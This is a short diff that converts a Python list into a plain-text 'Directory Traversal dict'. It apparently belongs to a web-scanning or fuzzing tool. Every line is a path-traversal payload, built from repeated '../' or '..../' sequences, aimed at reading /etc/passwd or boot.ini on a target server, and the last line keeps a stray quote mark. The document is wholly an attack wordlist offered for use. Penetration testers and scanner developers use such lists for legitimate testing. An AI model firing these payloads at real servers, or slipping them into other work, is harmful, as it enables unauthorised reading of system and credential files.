@@ -1,29 +1,26 @@
-# -*- coding: utf-8 -*-
+# Directory Traversal dict
 
-
-dt_dict = [
-    '../etc/passwd',
-    '../../etc/passwd',
-    '../../../etc/passwd',
-    '../../../../etc/passwd',
-    '../../../../../etc/passwd',
-    '../../../../../../etc/passwd',
-    '../../../../../../../etc/passwd',
-    '../../../../../../../../etc/passwd',
-    '..../etc/passwd',
-    '..../..../etc/passwd',
-    '..../..../..../etc/passwd',
-    '..../..../..../..../etc/passwd',
-    '..../..../..../..../..../etc/passwd',
-    '..../..../..../..../..../..../etc/passwd',
-    '..../..../..../..../..../..../..../etc/passwd',
-    '..../..../..../..../..../..../..../..../etc/passwd',
-    '../boot.ini',
-    '../../boot.ini',
-    '../../../boot.ini',
-    '../../../../boot.ini',
-    '../../../../../boot.ini',
-    '../../../../../../boot.ini',
-    '../../../../../../../boot.ini',
-    '../../../../../../../../boot.ini'
-]
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+..../etc/passwd
+..../..../etc/passwd
+..../..../..../etc/passwd
+..../..../..../..../etc/passwd
+..../..../..../..../..../etc/passwd
+..../..../..../..../..../..../etc/passwd
+..../..../..../..../..../..../..../etc/passwd
+..../..../..../..../..../..../..../..../etc/passwd
+../boot.ini
+../../boot.ini
+../../../boot.ini
+../../../../boot.ini
+../../../../../boot.ini
+../../../../../../boot.ini
+../../../../../../../boot.ini
+../../../../../../../../boot.ini'
